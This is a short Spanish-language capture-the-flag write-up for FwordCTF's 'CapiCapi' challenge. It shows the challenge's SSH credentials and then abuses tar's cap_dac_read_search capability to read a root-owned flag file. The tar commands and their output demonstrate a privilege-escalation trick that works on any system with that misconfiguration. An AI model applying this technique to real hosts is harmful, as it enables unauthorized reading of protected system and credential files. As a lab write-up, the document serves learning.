# Fword
## Bash
### CapiCapi
*You have to do some privilege escalation in order to read the flag! Use the following SSH credentials to connect to the server, each participant will have an isolated environment so you only have to pwn me!
SSH Credentials
ssh -p 2222 ctf@capicapi.fword.wtf
Password: FwordxKahla
Author: KAHLA*

Nos conectamos a la máquina objetivo y vemos que hay un flag.txt en el /home de nuestro usuario owneado por el root, despues de checkear vectores normales encontramos una capabilite poco comun
```bash
/usr/bin/tar = cap_dac_read_search+ep
```
Con esto podremos leer la flag sin problema al igual que cualquier otro archivo owned por root, ejecutamos lo siguiente
```bash
user1@c2002c8c2350:/home/user1$ /usr/bin/tar -cvf flag.tar /home/user1/flag.txt ## Con esto obtenmos una copia comprimida del archivo
/usr/bin/tar: Removing leading `/' from member names
/home/user1/flag.txt
user1@c2002c8c2350:/home/user1$ /usr/bin/tar -xvf flag.tar ## Con esto lo descomprimimos
home/user1/flag.txt
user1@c2002c8c2350:/home/user1$ cat home/user1/flag.txt ## Leemos la flag
FwordCTF{C4pAbiLities_4r3_t00_S3Cur3_NaruT0_0nc3_S4id}
```
